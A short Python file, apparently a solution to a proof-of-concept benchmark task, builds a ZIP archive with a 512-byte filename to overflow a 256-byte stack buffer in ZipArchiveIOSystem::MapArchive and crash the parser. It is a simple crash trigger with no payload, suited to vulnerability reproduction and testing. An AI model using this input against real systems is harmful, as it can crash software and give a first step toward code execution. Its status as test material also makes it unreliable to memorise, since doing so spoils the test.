import io
import zipfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow vulnerability in ZipArchiveIOSystem::MapArchive.
        The vulnerability is caused by copying a ZIP entry filename into a fixed-size 256-byte stack buffer without bounds checking.
        """
        # Create an in-memory buffer for the ZIP file
        zip_buffer = io.BytesIO()
        
        # Create a ZipFile object. ZIP_STORED is used to keep it simple (no compression).
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zf:
            # The buffer size is 256 bytes.
            # We create a filename of 512 bytes ('A' * 512).
            # This length is sufficient to overflow the buffer and corrupt the stack (saved RBP and return address),
            # causing a crash or sanitizer error.
            malicious_filename = "A" * 512
            
            # Write a file entry with the malicious filename.
            # The file content is empty as it is not relevant to triggering the filename parsing vulnerability.
            zf.writestr(malicious_filename, b"")
            
        # Return the raw bytes of the generated ZIP file
        return zip_buffer.getvalue()
